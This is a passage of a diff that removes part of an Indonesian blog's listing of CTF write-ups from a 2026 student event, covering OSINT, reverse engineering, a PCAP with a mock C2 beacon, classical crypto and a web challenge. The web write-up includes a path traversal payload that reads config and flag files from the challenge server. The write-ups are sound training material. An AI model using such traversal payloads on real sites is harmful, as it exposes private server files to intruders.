path:aftech.htmlSetelah membuka halaman aftech.html, terdapat petunjuk bahwa file gambar sering menyimpan informasi lebih dari yang terlihat, khususnya melalui metadata. Pada halaman tersebut juga terdapat gambar profil Ahmad Fauzi dengan nama file:profile ahmad.jpgSelanjutnya, saya membuka file robots.txt dan menemukan beberapa path tersembunyi: internal admin leaked env.txtPath yang paling relevan adalah leaked env.txt karena berhubungan dengan kebocoran konfigurasi. Setelah dibuka, file tersebut berisi konfigurasi API dan sebuah token terenkripsi:API TOKEN ENC VV9YViMEQmkCbEEGKUcuKFxBZlprTi5kQEAKXDpbQjRODari petunjuk pada blog Ahmad Fauzi, saya kemudian memeriksa metadata gambar profile ahmad.jpg. Pada metadata gambar ditemukan komentar:kunci2: X7qPKarena Ahmad Fauzi memiliki ID karyawan EMP-3391, maka bagian pertama kunci diambil dari ID tersebut, yaitu:3391Kemudian kunci kedua dari metadata adalah:X7qPSehingga kunci lengkap yang digunakan adalah:3391X7qPToken API TOKEN ENC kemudian didecode dari Base64, lalu hasilnya didekripsi menggunakan XOR dengan kunci 3391X7qP. Dari proses tersebut didapatkan flag:flag 3391 x7qp xor k3y 4ss3mbl3d Flagflag 3391 x7qp xor k3y 4ss3mbl3d Kesimpulan Hal yang DipelajariChallenge ini mengajarkan bahwa dalam OSINT, informasi penting tidak selalu terlihat langsung pada halaman utama. Petunjuk dapat tersebar di berbagai tempat seperti file CSV, robots.txt, file konfigurasi yang bocor, halaman blog pribadi, hingga metadata gambar. Selain itu, challenge ini juga menunjukkan pentingnya menggabungkan beberapa potongan informasi untuk mendapatkan kunci dekripsi yang benar.">
-        Pada challenge ini, diberikan sebuah website milik PT Siluman Teknologi. Berdasarkan narasi soal, data sensitif perusahaan diduga bocor dan tersebar di beberapa lokasi digital. Tujuan dari challenge ini adalah menelusuri jejak-jejak yang tersedia pada website untuk menemukan komponen yang diperlukan...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/perangkat-lunak-terkunci.html" class="post-excerpt-image" aria-label="W1-D2 Perangkat Lunak Terkunci">
-      <img src="/images/oxucl-logo.jpg" alt="W1-D2 Perangkat Lunak Terkunci" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/perangkat-lunak-terkunci.html">W1-D2 Perangkat Lunak Terkunci</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20rev%22" class="tag" data-tooltip='Show items with the tag "rev"'>
-        rev
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20binary%22" class="tag" data-tooltip='Show items with the tag "binary"'>
-        binary
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-D2: Perangkat Lunak Terkunci Kategori Reverse Binary Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Beginner File perangkat lunak terkunci Deskripsi SingkatPada challenge ini diberikan sebuah binary bernama perangkat lunak terkunci. Binary tersebut merupakan program verifikasi lisensi yang meminta input berupa kunci lisensi. Tujuan dari challenge ini adalah menganalisis cara program memvalidasi input, lalu menemukan license key yang benar agar program berhasil diaktifkan.Analisis AwalPertama, binary dijalankan untuk melihat perilakunya.. perangkat lunak terkunciProgram meminta input lisensi. Jika input salah, program akan menampilkan pesan bahwa lisensi tidak valid. Berdasarkan catatan soal, nilai yang tersimpan di dalam binary kemungkinan tidak disimpan dalam bentuk asli, sehingga perlu dianalisis menggunakan teknik reverse engineering sederhana.Selanjutnya dilakukan pengecekan string yang ada di dalam binary.strings perangkat lunak terkunciDari hasil pengecekan ditemukan sebuah string panjang berbentuk hexadecimal:666c61677b6833785f737472316e675f6c3163336e73335f637234636b33647dString tersebut terlihat seperti data yang sudah di-encode, bukan teks biasa.Langkah PenyelesaianKarena string yang ditemukan berbentuk hexadecimal, langkah berikutnya adalah melakukan decode dari hex ke ASCII.Decode dapat dilakukan menggunakan command berikut:echo 666c61677b6833785f737472316e675f6c3163336e73335f637234636b33647d xxd -r -pHasil decode-nya adalah:flag h3x str1ng l1c3ns3 cr4ck3d Setelah itu, hasil decode tersebut dicoba sebagai input lisensi ke program.. perangkat lunak terkunciKemudian masukkan:flag h3x str1ng l1c3ns3 cr4ck3d Program memberikan output bahwa lisensi valid dan perangkat lunak berhasil diaktifkan. Ini membuktikan bahwa string hexadecimal di dalam binary adalah license key yang benar setelah didecode.Flagflag h3x str1ng l1c3ns3 cr4ck3d Kesimpulan Hal yang DipelajariPada challenge ini, validasi lisensi dilakukan dengan membandingkan input pengguna dengan nilai yang sudah disimpan di dalam binary dalam bentuk hexadecimal. Dari challenge ini dapat dipelajari bahwa pada reverse engineering, string penting seperti password, key, atau flag tidak selalu disimpan dalam bentuk plaintext, tetapi bisa disamarkan menggunakan encoding sederhana seperti hex.">
-        Pada challenge ini diberikan sebuah binary bernama perangkat_lunak_terkunci. Binary tersebut merupakan program verifikasi lisensi yang meminta input berupa kunci lisensi. Tujuan dari challenge ini adalah menganalisis cara program memvalidasi input, lalu menemukan license key yang benar agar program berhasil diaktifkan....
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/pemeriksa-kredensial.html" class="post-excerpt-image" aria-label="W1-D3 Pemeriksa Kredensial">
-      <img src="/images/oxucl-logo.jpg" alt="W1-D3 Pemeriksa Kredensial" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/pemeriksa-kredensial.html">W1-D3 Pemeriksa Kredensial</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20rev%22" class="tag" data-tooltip='Show items with the tag "rev"'>
-        rev
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20binary%22" class="tag" data-tooltip='Show items with the tag "binary"'>
-        binary
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-D3: Pemeriksa Kredensial Kategori Reverse Binary Event ZERO DAY Mini Games 2026 File pemeriksa kredensial Deskripsi SingkatPada challenge W1-D3: Pemeriksa Kredensial, diberikan sebuah binary bernama pemeriksa kredensial. Binary ini meminta input kredensial, lalu menentukan apakah input tersebut benar atau salah. Tujuan dari challenge ini adalah melakukan analisis reverse engineering untuk mengetahui kredensial yang valid.Analisis AwalPertama, saya menjalankan pengecekan awal terhadap binary menggunakan perintah file.file pemeriksa kredensialHasilnya menunjukkan bahwa file merupakan binary ELF 64-bit untuk Linux dan tidak ter-strip, sehingga nama fungsi masih dapat terlihat saat dianalisis.Selanjutnya, saya menggunakan strings untuk melihat string yang tersimpan di dalam binary.strings pemeriksa kredensialDari hasil tersebut ditemukan beberapa string menarik seperti:ADMIN-CREDENTIAL-2026ROOT-ACCESS-TOKENfWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg Dua string pertama terlihat seperti kredensial, tetapi kemungkinan hanya decoy atau pengalih perhatian. String ketiga terlihat seperti Base64 karena memiliki pola karakter Base64 dan diakhiri dengan tanda .Langkah PenyelesaianBinary kemudian dianalisis lebih lanjut menggunakan objdump.objdump -d -Mintel pemeriksa kredensialDari fungsi main, ditemukan bahwa program melakukan beberapa proses terhadap input pengguna. Alurnya adalah: Program menerima input dari user. Karakter newline dihapus. Input dibalik menggunakan fungsi reverse str. Hasil reverse kemudian di-encode menggunakan fungsi b64 encode. Hasil encoding dibandingkan dengan string Base64 yang tersimpan di binary.String pembanding yang ditemukan adalah:fWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg Karena program melakukan proses:input reverse base64 encode comparemaka untuk mendapatkan input asli, urutan tersebut harus dibalik:base64 decode reverseSaya menggunakan Python untuk melakukan decoding.python3 -c import base64; s fWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg ; print base64.b64decode s .decode Hasil decode Base64: d3kc4rc n14hc 463s4b 3sr3v3r galfHasil tersebut masih dalam kondisi terbalik, sehingga perlu dibalik lagi.python3 -c import base64; s fWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg ; print base64.b64decode s .decode ::-1 Hasil akhirnya adalah:flag r3v3rs3 b4s364 ch41n cr4ck3d Setelah input tersebut dimasukkan ke program, binary menampilkan pesan bahwa kredensial benar dan akses diberikan.printf flag r3v3rs3 b4s364 ch41n cr4ck3d n . pemeriksa kredensialOutput:Kredensial benar Akses diberikan.Flagflag r3v3rs3 b4s364 ch41n cr4ck3d Kesimpulan Hal yang DipelajariPada challenge ini, flag tidak langsung tersimpan dalam bentuk plaintext. Binary melakukan beberapa lapisan transformasi, yaitu membalik input lalu melakukan encoding Base64 sebelum membandingkannya dengan nilai yang sudah disimpan. Dari challenge ini dipelajari bahwa saat melakukan reverse engineering, penting untuk memahami urutan transformasi yang dilakukan program. Untuk mendapatkan nilai asli, proses tersebut harus dibalik dengan urutan yang berlawanan.">
-        Pada challenge W1-D3: Pemeriksa Kredensial, diberikan sebuah binary bernama pemeriksa_kredensial. Binary ini meminta input kredensial, lalu menentukan apakah input tersebut benar atau salah. Tujuan dari challenge ini adalah melakukan analisis reverse engineering untuk mengetahui kredensial yang valid. Analisis Awal Pertama,...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/manajer-berkas-internal.html" class="post-excerpt-image" aria-label="W1-C2 Manajer Berkas Internal">
-      <img src="/images/oxucl-logo.jpg" alt="W1-C2 Manajer Berkas Internal" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/manajer-berkas-internal.html">W1-C2 Manajer Berkas Internal</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20web%22" class="tag" data-tooltip='Show items with the tag "web"'>
-        web
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-C2: Manajer Berkas Internal Kategori Web Breach Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Beginner Target Website Manajer Berkas Internal PT Cahaya Nusantara Deskripsi SingkatPada challenge ini diberikan sebuah website manajemen berkas internal milik PT Cahaya Nusantara. Website tersebut digunakan untuk menampilkan beberapa dokumen internal seperti halaman beranda, dokumen, laporan, dan panduan.Dari narasi soal dijelaskan bahwa sistem menggunakan parameter URL untuk menentukan berkas yang ditampilkan. Catatan soal juga memberikan petunjuk bahwa validasi yang tidak sempurna dapat membuka akses ke seluruh sistem. Berdasarkan petunjuk tersebut, kemungkinan besar terdapat celah pada proses pembacaan file melalui parameter URL.Analisis AwalSaat membuka halaman utama, terlihat bahwa website menampilkan isi file welcome.txt. Pada menu navigasi, setiap halaman dipanggil menggunakan parameter page, contohnya: page welcome.txt page dokumen.txt page laporan.txt page panduan.txtHal ini menunjukkan bahwa aplikasi membaca file berdasarkan nilai dari parameter page.Kemudian saya memeriksa source code halaman dan menemukan komentar HTML berikut: lt; -- Konfigurasi: lihat var www html config.php untuk referensi path flag file -- gt;Komentar tersebut menjadi petunjuk penting karena memberitahu bahwa file konfigurasi berada di: var www html config.phpSelain itu, file tersebut juga disebut berisi referensi menuju lokasi file flag.Langkah PenyelesaianLangkah pertama adalah mencoba membaca file config.php menggunakan teknik path traversal melalui parameter page.Payload yang digunakan: page .. .. .. .. var www html config.phpSetelah payload tersebut dijalankan melalui browser, isi file config.php berhasil ditampilkan. Di dalam file tersebut ditemukan konfigurasi berikut: lt; php config.php - Konfigurasi Sistem Manajer Berkas Internal File ini berisi konfigurasi path dan pengaturan aplikasi. Path ke direktori halamandefine PAGES DIR , var www html pages ; Path token autentikasi sistem flag file var www private flag.txt ; Pengaturan tampilandefine APP NAME , Manajer Berkas Internal ;define APP VERSION , 1.4.2 ;define COMPANY , PT Cahaya Nusantara ;Dari file konfigurasi tersebut, diketahui bahwa lokasi flag berada di: var www private flag.txtSetelah mengetahui lokasi flag, saya kembali menggunakan parameter page untuk membaca file tersebut: page .. .. .. .. var www private flag.txtPayload tersebut berhasil menampilkan isi file flag pada halaman website. Setelah flag didapatkan, flag kemudian disubmit ke platform dan berhasil diterima.FlagDSG ... Kesimpulan Hal yang DipelajariChallenge ini memanfaatkan kerentanan Local File Inclusion atau Path Traversal. Kerentanan terjadi karena aplikasi menerima input dari parameter page untuk menentukan file yang akan dibaca, tetapi tidak membatasi akses hanya ke direktori file yang seharusnya.Akibatnya, pengguna dapat menggunakan pola .. untuk keluar dari direktori halaman dan membaca file lain di server, termasuk file konfigurasi dan file flag. Dari challenge ini dapat dipelajari bahwa validasi path sangat penting pada fitur pembacaan file. Aplikasi seharusnya menggunakan whitelist file yang boleh diakses, membatasi direktori kerja, serta mencegah penggunaan traversal sequence seperti .. .">
-        Pada challenge ini diberikan sebuah website manajemen berkas internal milik PT Cahaya Nusantara. Website tersebut digunakan untuk menampilkan beberapa dokumen internal seperti halaman beranda, dokumen, laporan, dan panduan. Dari narasi soal dijelaskan bahwa sistem menggunakan parameter URL untuk menentukan berkas...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/lalu-lintas-jaringan.html" class="post-excerpt-image" aria-label="W1-E2 Lalu Lintas Jaringan">
-      <img src="/images/oxucl-logo.jpg" alt="W1-E2 Lalu Lintas Jaringan" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/lalu-lintas-jaringan.html">W1-E2 Lalu Lintas Jaringan</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20forensics%22" class="tag" data-tooltip='Show items with the tag "forensics"'>
-        forensics
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-E2: Lalu Lintas Jaringan Kategori Digital Forensics Event ZERO DAY Mini Games 2026 File traffic.pcap Deskripsi SingkatPada challenge W1-E2: Lalu Lintas Jaringan, diberikan sebuah file capture bernama traffic.pcap. File ini berisi rekaman lalu lintas jaringan dari workstation yang dicurigai melakukan komunikasi tidak sah dengan server eksternal. Tujuan dari challenge ini adalah menganalisis traffic tersebut dan menemukan data tersembunyi yang mengarah ke flag.Analisis AwalLangkah pertama yang saya lakukan adalah membuka file traffic.pcap menggunakan Wireshark. Dari hasil pengamatan awal, terlihat bahwa traffic berisi beberapa komunikasi HTTP biasa, seperti akses ke website umum, request status API, request ping internal, dan komunikasi ke beberapa endpoint.Untuk mempercepat analisis, saya juga menggunakan perintah strings agar dapat melihat teks yang terbaca langsung dari file PCAP.strings traffic.pcapDari hasil tersebut terlihat beberapa request HTTP, salah satunya menuju host berikut:backend.siluman-tech.idHost ini terlihat mencurigakan karena terdapat beberapa endpoint yang tidak umum, seperti: api submit session refresh api c2 beacon update checkSelain itu, ditemukan juga beberapa data yang terlihat seperti Base64.Langkah PenyelesaianPada awalnya ditemukan request berikut:POST api submit HTTP 1.1Host: backend.siluman-tech.iduser id EMP3391 amp;action check in amp;secret token c2VjcmV0XzRiOGYyYzlkMWE2ZTNmN2IwYzVkMmU4YTlmNGIxYzdlNilai secret token tersebut terlihat seperti Base64, sehingga saya mencoba melakukan decode.echo c2VjcmV0XzRiOGYyYzlkMWE2ZTNmN2IwYzVkMmU4YTlmNGIxYzdl base64 -dHasilnya:secret 4b8f2c9d1a6e3f7b0c5d2e8a9f4b1c7eNamun hasil tersebut bukan flag, melainkan hanya token atau petunjuk lain. Karena challenge menyebutkan adanya data yang disembunyikan dalam lalu lintas normal, saya melanjutkan analisis ke request lain yang terlihat lebih mencurigakan.Kemudian ditemukan komunikasi berikut:POST api c2 beacon HTTP 1.1Host: backend.siluman-tech.idContent-Type: application jsonX-Client-ID: SLM-EMP3391 host : WS-3391 , os : win10 , ts :1748000000 Endpoint api c2 beacon cukup mencurigakan karena istilah C2 biasanya merujuk pada Command and Control, yaitu komunikasi antara client yang terinfeksi dengan server pengendali.Response dari server berisi data berikut:HTTP 1.1 200 OKContent-Type: application jsonX-Request-ID: c2-20260528-9f3a status : ok , task : idle , ref : ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9 Pada bagian response terdapat field ref yang berisi string Base64:ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9String tersebut kemudian saya decode menggunakan perintah:echo ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9 base64 -dHasil decode-nya adalah:flag pcap c2 r3f b4s364 3xf1l Dari sini dapat disimpulkan bahwa flag disembunyikan pada response komunikasi C2 dalam field ref, lalu diencoding menggunakan Base64.Flagflag pcap c2 r3f b4s364 3xf1l Kesimpulan Hal yang DipelajariPada challenge ini, flag tidak muncul secara langsung di tampilan traffic biasa. Data penting disamarkan dalam komunikasi HTTP yang terlihat normal, tepatnya pada response endpoint api c2 beacon. Dari challenge ini dipelajari bahwa dalam analisis PCAP, kita tidak hanya perlu melihat request yang terlihat mencurigakan, tetapi juga perlu memeriksa response server, parameter tersembunyi, header, serta data yang tampak seperti hasil encoding. Base64 sering digunakan untuk menyamarkan data agar tidak langsung terbaca.">
-        Pada challenge W1-E2: Lalu Lintas Jaringan, diberikan sebuah file capture bernama traffic.pcap. File ini berisi rekaman lalu lintas jaringan dari workstation yang dicurigai melakukan komunikasi tidak sah dengan server eksternal. Tujuan dari challenge ini adalah menganalisis traffic tersebut dan menemukan...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/korespondensi-tersegel.html" class="post-excerpt-image" aria-label="Korespondensi Tersegel">
-      <img src="/images/oxucl-logo.jpg" alt="Korespondensi Tersegel" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/korespondensi-tersegel.html">Korespondensi Tersegel</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20crypto%22" class="tag" data-tooltip='Show items with the tag "crypto"'>
-        crypto
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20puzzle%22" class="tag" data-tooltip='Show items with the tag "puzzle"'>
-        puzzle
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge Korespondensi Tersegel Kategori Crypto amp; Puzzle Event ZERO DAY Scholar Battle Poin 25 Difficulty Easy File readme.txt, company logo.jpg, cipher text.txt Deskripsi SingkatPada challenge ini, diberikan sebuah teks terenkripsi yang diduga merupakan korespondensi internal dari PT Arkana Sistem. Tugas utama dari challenge ini adalah menemukan metode enkripsi yang digunakan, mencari kunci dekripsi, lalu mendekripsi pesan untuk mendapatkan flag.Analisis AwalLangkah pertama yang saya lakukan adalah membaca file readme.txt. Dari file tersebut diketahui bahwa pesan dienkripsi menggunakan metode klasik, dan kunci dekripsi dapat ditemukan pada salah satu file lain di dalam archive. Readme juga memberikan petunjuk untuk memeriksa data yang tidak terlihat secara visual.Selanjutnya, saya membuka file cipher text.txt. Isi file tersebut berupa teks acak dengan huruf kapital, tetapi susunannya masih menyerupai format surat atau korespondensi. Di dalam teks tersebut juga terdapat bagian yang terlihat seperti flag, yaitu:SLAX F1G3A3R3 4RB4X4 D3PRYGD3D Bagian ini kemungkinan besar merupakan flag yang masih terenkripsi. Karena readme menyebutkan bahwa kunci ada pada file lain dan perlu memeriksa data yang tidak terlihat secara visual, saya kemudian mengecek metadata dari file company logo.jpg.Langkah Penyelesaian Membaca file readme.txt untuk mencari petunjuk awal. Dari readme, diketahui bahwa: Cipher yang digunakan adalah metode klasik Kunci berada di salah satu file lain Perlu memeriksa data tersembunyi atau metadata Mengecek metadata gambar company logo.jpg menggunakan perintah:exiftool company logo.jpg Dari metadata gambar ditemukan komentar:kunci: ARKANA Karena kunci berupa kata, metode klasik yang sesuai adalah Vigenere Cipher. Melakukan dekripsi isi cipher text.txt menggunakan Vigenere Cipher dengan key:ARKANA Setelah didekripsi, teks menjadi terbaca sebagai korespondensi internal. Bagian flag yang awalnya:SLAX F1G3A3R3 4RB4X4 D3PRYGD3D berubah menjadi:FLAG V1G3N3R3 4RK4N4 D3CRYPT3D Karena instruksi challenge meminta submit flag dalam format huruf kecil, maka flag diubah menjadi lowercase.Flagflag v1g3n3r3 4rk4n4 d3crypt3d Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa pada soal kriptografi, petunjuk tidak selalu berada langsung di file ciphertext. File pendukung seperti gambar juga bisa menyimpan informasi penting melalui metadata. Selain itu, ketika sebuah cipher klasik menggunakan kunci berupa kata, salah satu metode yang perlu dicoba adalah Vigenere Cipher. Pada challenge ini, key ARKANA berhasil digunakan untuk mendekripsi pesan dan mendapatkan flag.">
-        Pada challenge ini, diberikan sebuah teks terenkripsi yang diduga merupakan korespondensi internal dari PT Arkana Sistem. Tugas utama dari challenge ini adalah menemukan metode enkripsi yang digunakan, mencari kunci dekripsi, lalu mendekripsi pesan untuk mendapatkan flag. Analisis Awal Langkah pertama...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/konfigurasi-terenkripsi.html" class="post-excerpt-image" aria-label="W1-A3 Konfigurasi Terenkripsi">
-      <img src="/images/oxucl-logo.jpg" alt="W1-A3 Konfigurasi Terenkripsi" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/konfigurasi-terenkripsi.html">W1-A3 Konfigurasi Terenkripsi</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20crypto%22" class="tag" data-tooltip='Show items with the tag "crypto"'>
-        crypto
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20puzzle%22" class="tag" data-tooltip='Show items with the tag "puzzle"'>
-        puzzle
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-A3 Konfigurasi Terenkripsi Kategori Crypto amp; Puzzle Event ZERO DAY Mini Games 2026 Poin 200 Difficulty Beginner File config.bin, key hint.txt, dan partial source.c Deskripsi SingkatPada challenge ini diberikan sebuah file binary blob konfigurasi dari perangkat IoT yang diduga telah dikompromikan. Bersama file tersebut, terdapat catatan analis dan potongan source code yang menjelaskan cara data konfigurasi diproses. Tujuan dari challenge ini adalah memahami struktur file binary, menemukan kunci enkripsi, lalu mendecode isi konfigurasi hingga mendapatkan flag.Analisis AwalLangkah pertama yang saya lakukan adalah membaca file key hint.txt. Dari catatan tersebut diketahui bahwa 4 byte pertama pada file config.bin merupakan XOR key. Nilai pada offset 0x00-0x03 adalah:4B 33 61 5FJika dikonversi dari hexadecimal ke ASCII, nilai tersebut menjadi:K3a Selanjutnya, saya membaca file partial source.c. Dari potongan source code tersebut terlihat bahwa program membaca 4 byte pertama sebagai key, lalu melewati 4 byte awal file sebelum melakukan proses decode. Data setelah offset 0x04 di-XOR menggunakan key 4-byte secara berulang atau siklik.Catatan pada soal berbunyi: Dalam analisis biner, yang tampak jelas seringkali adalah pengalih perhatian. Petunjuk ini menunjukkan bahwa tidak cukup hanya melihat string yang tampak langsung dari file binary. Isi sebenarnya perlu didecode terlebih dahulu menggunakan algoritma yang sesuai dengan source code yang diberikan.Langkah PenyelesaianPertama, saya membuka file petunjuk untuk mengetahui struktur config.bin. Struktur file tersebut 